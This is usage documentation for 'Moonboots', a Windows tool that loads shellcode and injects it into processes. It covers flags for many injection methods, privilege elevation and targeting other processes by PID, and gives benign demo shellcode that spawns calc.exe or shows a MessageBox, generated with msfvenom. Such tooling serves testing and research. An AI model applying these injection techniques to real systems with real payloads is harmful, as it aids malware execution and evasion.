# Quickstart
## Usage
```cli
Usage:
  moonboots [flags]

Flags:
  -A, --admin                      Self elevate to high-integrity if needed (might trigger UAC)
  -a, --args string                Args to pass to the new process. Alias for '-o args="<cli>"'
  -c, --clipboard                  Fetch shellcode from the clipboard
  -d, --debug                      Debug output
  -w, --delay-on-return duration   Add a delay after the injection routine has returned and before cleanup
  -D, --demo                       Execute a built-in demo shellcode spawning calc.exe
  -C, --dirty-hex                  Attempt to clean the shellcode by removing prefixes and keeping only hexadecimal runes [a-fA-F0-9]. This allows copying shellcode from various sources without having to clean it first, like C source code or \x and 0x prefixed shellcode
  -f, --file string                File containing the shellcode to load in raw, hex or base64 format
  -h, --help                       help for moonboots
  -i, --idle                       Enter an infinite loop before starting the shellcode to allow debugger to attach
  -k, --keep                       Don't terminate the target process on error
  -m, --method string              Method to use to load the shellcode. Available: [createthreadnative earlybird dirtyvanity rtlcreateuserthread uuid createprocess syscall createthread etwpcreate queueapc createfiber createremotethread createremotethreadnative] (default "createthread")
  -o, --option stringToString      Set options for the loader, such as the target program to inject your shellcode in. Repeat it for each option, as many times as needed, e.g. '-o target=notepad.exe -o args="C:\users\user\Desktop\mydoc.txt"' (default [])
  -p, --pid string                 PID of the process to target. Alias for '-o pid=<PID>'
  -P, --pid-pipe string            Specify the name of the rendez-vous pipe to pass the PID of the loaded shellcode to the parent process. This feature is enabled only if this flag is used
  -E, --priv-debug                 Enable debug privileges. The program will self elevate to high-integrity if the current rights are too low (might trigger UAC)
  -e, --sc-encoding string         Specify the encoding of the input shellcode if the wrong one is selected automatically. This would be required for base64-encoded shellcode that would result in a valid hex-encoded string or ascii shellcode. Valid encodings: [base64 hex raw]
  -s, --shellcode string           Shellcode in hex (i.e. '50515253...') or base64 format (i.e. 'UFFSU1ZX...')
  -t, --target string              Target executable to inject shellcode into. Alias for '-o target="<path>"'
  -v, --verbose                    Verbose output
      --version                    version for moonboots
```

## Examples
> Note that for simplicity's sake, we use `moonboots.exe` as the executable's name. In reality, the release contains a Moonboots version for each supported architecture, x86 and x64, both named accordingly: `moonboots_x86.exe` and `moonboots_x64.exe`. Keep in mind that shellcode execution depends on using compatible shellcode, technique and target to run smoothly. Depending on the shellcode and the technique used, you also must be careful to use the Moonboots executable with the right architecture.

Run a hex or base64-encoded shellcode using the default "createthread" method
```cli
moonboots.exe -s <shellcode>
```

Add an infinite loop (`EB FE`) right before the shellcode starts so you can attach a debugger on the shellcode's entry point
```cli
moonboots.exe -s <shellcode> --idle
```

Fetch the shellcode from the clipboard
```cli
moonboots.exe -c
```

Fetch the shellcode from the clipboard and clean the input to only keep hexadecimal values. This allows for quick testing of shellcodes coming from various sources without having to clean it first, like C source code or \x and 0x prefixed shellcode 
```cli
moonboots.exe -Cc
```

Inject the shellcode contained in the file into a new cmd.exe process using the "etwpcreateetwthread" method
```cli
moonboots.exe -m etwpcreateetwthread --target cmd.exe -s <shellcode>
```
```cli
moonboots.exe -m etwpcreateetwthread --target cmd.exe -f <filepath>
```

Inject the shellcode into the process with the given PID using the "createremotethread" method
```cli
moonboots.exe --pid <x86 process PID> -m createremotethread -s <shellcode>
```

Check if a specific method is working
```cli
moonboots.exe --pid <x86 process PID> -m createremotethread -s <shellcode>
```

## Idle
The `--idle|-i` flag will prepend the `EB FE` byte sequence to the shellcode before loading it. This will make the shellcode jump to this instruction indefinitely, creating an infinite loop. 

This is useful when attaching a debugger to the bootstrap program, as it won't be able to attach to a suspended process.

## Shellcode
Moonboots will try to automatically detect if the input shellcode is raw, hex, or base64 encoded. Note that raw is only supported with the `--file` flag.

The `--dirty-hex|-C` option will attempt to clean the shellcode before parsing it. It will follow these steps:
1. Remove everything before an "=" sign
1. For every line, remove every inline comments (only "//" and "#" are supported)
1. Strip a potential *0x* prefix ('\x' prefix is handled by the next step)
1. Remove every character out of the hexadecimal range (i.e. [a-fA-F0-9])

This way, inputs similar to the one below can then be correctly parsed by Moonboots without any additional manual cleaning:

```c
char shellcode[] =
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2"
"\x51\x68\x6c\x6c\x20\x20\x68\x33"
"\x32\x2e\x64\x68\x75\x73\x65\x72"
"\x89\xe1\xbb\x7b\x1d\x80\x7c\x51" // 0x7c801d7b ; LoadLibraryA(user32.dll)
"\xff\xd3\xb9\x5e\x67\x30\xef\x81"
"\xc1\x11\x11\x11\x11\x51\x68\x61"
"\x67\x65\x42\x68\x4d\x65\x73\x73"
"\x89\xe1\x51\x50\xbb\x40\xae\x80" // 0x7c80ae40 ; GetProcAddress(user32.dll, MessageBoxA)
"\x7c\xff\xd3\x89\xe1\x31\xd2\x52"
"\x51\x51\x52\xff\xd0\x31\xc0\x50"
"\xb8\x12\xcb\x81\x7c\xff\xd0";    // 0x7c81cb12 ; ExitProcess(0)
```

Combining this with the clipboard feature (`--clipboard|-c`), you can use the above shellcode directly without needing to clean or paste it anywhere by copying it to your clipboard and run `.\moonboots_x64.exe -Cc`. 

### Demo shellcodes
+ x86

```cli
msfvenom -p windows/exec CMD="calc.exe" EXITFUNC=thread | xxd -ps | tr -d '\n'
```

```shellcode
fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6a018d85b20000005068318b6f87ffd5bbe01d2a0a68a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd5636d642e657865202f432063616c632e65786500
```

+ x64

```cli
msfvenom -p windows/x64/exec CMD="calc.exe" EXITFUNC=thread | xxd -ps | tr -d '\n'`
```

```shellcode
fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d48ba01000000000000488d8d0101000041ba318b6f87ffd5bbe01d2a0a41baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd563616c632e65786500
```

> The `EXITFUNC=thread` makes them compatible with process injection, preventing the whole process to terminate after spawning `calc.exe`
